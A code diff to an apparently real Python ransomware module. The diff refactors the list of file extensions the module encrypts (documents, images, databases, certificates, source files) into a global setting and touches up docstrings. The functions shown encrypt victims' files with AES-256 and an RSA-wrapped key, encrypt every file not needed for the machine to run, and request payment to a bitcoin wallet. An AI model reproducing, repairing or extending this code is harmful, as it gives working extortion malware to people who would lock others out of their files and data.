@@ -11,10 +11,6 @@ import Queue
 import base64
 import urllib
 import threading
-try:
-    from cStringIO import StringIO
-except:
-    from StringIO import StringIO
 
 # utilities
 try:
@@ -113,7 +109,7 @@ def request_payment(bitcoin_wallet, text=None, title=None):
 
 
 def encrypt_file(filename, rsa_key):
-    """
+    """ 
     Encrypt a file with AES-256-OCB symmetric encryption
     using a randomly generated key, encrypt the key
     with RSA-2048 asymmetric encryption, then store the
@@ -128,16 +124,7 @@ def encrypt_file(filename, rsa_key):
     """
     try:
         if os.path.isfile(filename):
-            if os.path.splitext(filename)[1] in [
-'.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
-'.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
-'.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', 
-'.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', 
-'.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpeg','.tmp','.log',
-'.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', 
-'.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', 
-'.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html',
-'.css','.js','.rb','.xml','.py','.pyc','.wmi','.sh','.spec','.asp','.aspx','.plist','.json','.sql','.vbs','.ps1']:
+            if os.path.splitext(filename)[1] in globals()['filetypes']:
                 if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
                     cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                     aes_key = Crypto.Random.get_random_bytes(32)
@@ -158,7 +145,7 @@ def encrypt_file(filename, rsa_key):
 
 
 def decrypt_file(filename, key):
-    """
+    """ 
     Decrypt a file that was encrypted with AES-256-OCB encryption
 
     `Required`
@@ -184,7 +171,7 @@ def decrypt_file(filename, key):
 
 
 def encrypt_files(args):
-    """
+    """ 
     Encrypt all files that are not required for the machine to function
 
     `Required`
@@ -211,7 +198,7 @@ def encrypt_files(args):
 
 
 def decrypt_files(rsa_key):
-    """
+    """ 
     Decrypt all encrypted files on host machine
 
     `Required`
